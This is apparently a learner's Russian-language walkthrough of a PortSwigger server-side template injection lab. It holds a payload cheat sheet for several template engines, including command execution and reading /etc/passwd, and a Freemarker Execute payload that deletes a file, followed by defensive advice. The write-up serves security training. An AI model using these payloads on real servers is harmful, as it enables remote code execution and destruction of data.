#### недрение шаблона на стороне сервера с использованием документации

лаба https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation

задание
1 -  определите механизм создания шаблонов
2 - используйте документацию для разработки способа выполнения произвольного кода
3- удалить `morale.txt` файл из домашнего каталога Карлоса

----------

перерыл весь сайт
и вот нашел, видимо, вектор атаки

войдя в аккаунт контен-менеджера (по заданию дан)

на стр постов - можно редактировать посты!

------

вот запрос который редактирует описание под постом 
```http
POST /product/template?productId=1 HTTP/2
Host: 0ac800d804bd16a781af340d00300059.web-security-academy.net
Cookie: session=TlPKIARxWhLnBqLsyiyW2vFVAcnENy01
Content-Length: 96
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Origin: https://0ac800d804bd16a781af340d00300059.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac800d804bd16a781af340d00300059.web-security-academy.net/product/template?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=rkmAhxNJZ7aAPsx9kzLSiEjGWLRToHfK&template=%3Cp%3EHackckckck+%3C%2Fp%3E&template-action=save
```

а вот по этому запросу можно открыть пост и посмотреть, как поменялся коммент
`GET /product?productId=1 HTTP/2`
руки сразу тянуться проверять xss,  но тема здесь другая

-----

я начал перебирать шпаргалку свою
## шпаргалка по пэйлоадам (для разных движков)

### Python (Jinja2, Mako, Tornado)
```c
{{config}}
{{6*6}}
{{self.__init__.__globals__.__builtins__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
### Ruby (ERB)
```c
<%= system('id') %>
<%= File.read('/etc/passwd') %>
<%= `id` %>
```

### Java (Freemarker, Velocity)
```c
${7*7}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
${.vars["java.lang.Runtime"].getRuntime().exec("id")}
```

### PHP (Twig, Smarty)
```c
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{$smarty.version}
{php}echo system('id');{/php}
```




и вот нашел уязвимость!!!!!!!
пейлоад `${7*7}`
запрос с параметрами 
```c

csrf=rkmAhxNJZ7aAPsx9kzLSiEjGWLRToHfK&template=${7*7}&template-action=save
```
сработал и я в ответе получил 49!!!
`<p>49 </p>`
а значит - имеем дело с Java (Freemarker, Velocity)

-----------

теперь нужно разобраться в контексте
отправляю пейлоад `${7*7*u}` спецом с ошибкой
ответ с подробной ошибкой
```q
FreeMarker template error (DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> u [in template "freemarker" at line 1, column 7] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, 

or use <#if myOptionalVar??>when-present<#else>when-missing. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-

related): - Failed at: ${7 * 7 * u} [in template "freemarker" at

 line 1, column 1] 
 
 ---- Java stack trace (for programmers): ---- 
 
 freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.UnexpectedTypeException.newDescriptionBuilder(UnexpectedTypeException.java:85) at freemarker.core.UnexpectedTypeException.(UnexpectedTypeException.java:48) at freemarker.core.NonNumericalException.(NonNumericalException.java:47) at freemarker.core.Expression.modelToNumber(Expression.java:160) at freemarker.core.Expression.evalToNumber(Expression.java:153) at freemarker.core.ArithmeticExpression._eval(ArithmeticExpression.java:51) at freemarker.core.Expression.eval(Expression.java:101) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)
```

это тоже уязвимость, такие ошибки на продакшене не должны быть

теперь знаю, что это FreeMarker (Java-шаблонизатор)


-------


есть  классические команды 
например 
```c
${.version}
```
ответ
```c
2.3.29
```

----------

в документации freemarker есть инфа про класс Execute
который позволяет выполнять shell-команды
```c
${"freemarker.template.utility.Execute"?new()("id")}
```

---------

делаю под удаление файла morale.txt
```c

${"freemarker.template.utility.Execute"?new()("rm%20/home/carlos/morale.txt")}
```

и вуаля - лаба решена!

---------


#### выводы 

  
я смог взломать лабу потому что у меня были права редактировать шаблоны товаров и я мог вставлять туда произвольный код

сначала я перебрал пэйлоады из шпаргалки и нашел что ${7*7} отработал 

потом я специально вызвал ошибку ${7*7*u} и получил подробный стектрейс который подтвердил что движок java = freemarker + показал версию

после этого я  (не полез в официальную документацию freemarker - а попросил ии это сделать) и ии - нашел раздел про класс Execute который позволяет выполнять shell-команды

я сформировал пэйлоад ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")} и вставил его в шаблон

после сохранения файл morale.txt был удален

----------

никакой защиты не было вообще

ни от специсимволов, ни от внешнего доступа к серверу
++++ ко всему - выпадали очень подробные ошибки (что недопустимо в продакте)

-----
#### защита

наверно, если можно - то - отключать опасные классы вроде Execute

не включать DEBUG режим на продакшене (в ошибках много инфы)

использовать белые списки разрешенных функций вместо черных

не давать пользователям доступ к шаблонам если это не абсолютно необходимо

экранировать и валидировать спец символы

ограничивать число подозрительных запросов к серверу